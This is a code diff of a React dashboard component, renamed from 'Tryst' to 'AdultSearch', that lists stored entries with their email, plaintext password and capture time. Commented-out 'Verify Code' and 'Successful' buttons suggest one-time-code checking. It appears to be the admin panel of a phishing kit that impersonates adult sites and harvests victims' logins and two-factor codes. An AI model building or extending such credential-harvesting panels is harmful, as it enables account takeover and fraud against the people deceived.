@@ -1,5 +1,5 @@
 import React, { useEffect, useRef, useState } from 'react'
-import { FaUser, FaEnvelope, FaKey, FaDesktop, FaCode } from 'react-icons/fa';
+import { FaUser, FaEnvelope, FaKey, FaDesktop } from 'react-icons/fa';
 import { MdAccessTime, MdAccessTimeFilled } from 'react-icons/md';
 import { useOutletContext } from 'react-router-dom';
 import { db } from '../config/firebase';
@@ -8,15 +8,11 @@ import { PiCaretDoubleLeftDuotone, PiCaretDoubleRightDuotone } from 'react-icons
 import { toast } from 'react-toastify';
 import { DateTime } from 'luxon';
 
+const AdultSearch = () => {
 
+  const { isUserAuthenticated, userData, myAdultSearchItems } = useOutletContext()
 
-const Tryst = () => {
-
-  const { isUserAuthenticated, userData, myTrystItems } = useOutletContext()
-
-  console.log(myTrystItems?.length)
-
-  const allData = myTrystItems?.slice()?.sort((a, b) => b?.createdAt - a?.createdAt)
+  const allData = myAdultSearchItems?.slice()?.sort((a, b) => b?.createdAt - a?.createdAt)
 
   const role = userData?.role;
 
@@ -106,12 +102,12 @@ const Tryst = () => {
                   Password
                 </div>
               </th>
-              <th className="px-4 py-3 text-left">
+              {/* <th className="px-4 py-3 text-left">
                 <div className=' flex items-center'>
-                  <FaCode className="inline mr-1" />
-                  Code
+                  <FaDesktop className="inline mr-1" />
+                  Access
                 </div>
-              </th>
+              </th> */}
               <th className="px-4 py-3 text-left">
                 <div className=' flex items-center min-w-40'>
                   <MdAccessTimeFilled className="inline mr-1" />
@@ -139,7 +135,12 @@ const Tryst = () => {
                 ) : null}
                 <td className="px-4 py-3 ">{element?.email}</td>
                 <td className="px-4 py-3 ">{element?.password}</td>
-                <td className="px-4 py-3 text-gray-600 ">{element?.code}</td>
+                {/* <td className="px-4 py-3 text-gray-600 ">
+                  <div className=' text-white flex flex-col items-center gap-2 sm:text-lg text-sm '>
+                    <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-blue-500' onClick={() => handleVerify(element?.id)}>Verify Code</button>
+                    <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-green-500' onClick={() => handleSuccess(element?.id)}>Successful</button>
+                  </div>
+                </td> */}
                 <td className="px-4 py-3 ">{element?.createdAt ? <div className=' flex flex-col gap-2 text-base font-semibold text-slate-600'>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('HH:mm:ss')}</div>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('dd-MM-yyyy')}</div>
@@ -154,4 +155,4 @@ const Tryst = () => {
   )
 }
 
-export default Tryst
+export default AdultSearch
